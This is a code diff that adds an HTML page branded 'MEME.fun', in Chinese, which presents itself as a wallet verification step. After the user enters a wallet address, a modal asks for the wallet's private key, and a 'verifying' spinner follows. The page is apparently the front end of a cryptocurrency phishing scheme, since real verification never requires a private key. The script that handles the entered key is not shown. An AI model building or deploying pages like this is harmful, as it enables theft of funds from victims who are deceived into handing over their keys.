@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEME.fun - 钱包验证</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>MEME.fun</h1>
+        </div>
+        
+        <div class="wallet-form">
+            <h2>请输入您的钱包地址</h2>
+            <div class="input-group">
+                <input type="text" id="walletAddress" placeholder="输入钱包地址 (0x...)">
+                <button id="verifyButton">验证</button>
+            </div>
+            <p id="errorMessage" class="error-message"></p>
+        </div>
+
+        <!-- 私钥输入弹窗 -->
+        <div id="privateKeyModal" class="modal">
+            <div class="modal-content">
+                <h2>请输入私钥</h2>
+                <p>请输入与该钱包地址匹配的私钥</p>
+                <input type="password" id="privateKey" placeholder="输入私钥">
+                <div class="modal-buttons">
+                    <button id="cancelButton">取消</button>
+                    <button id="confirmButton">确认</button>
+                </div>
+                <p id="modalError" class="error-message"></p>
+            </div>
+        </div>
+
+        <!-- 加载动画 -->
+        <div id="loadingOverlay" class="loading-overlay">
+            <div class="spinner"></div>
+            <p>正在验证...</p>
+        </div>
+    </div>
+
+    <!-- 添加署名 -->
+    <div class="signature">
+        by: Jony
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html> 
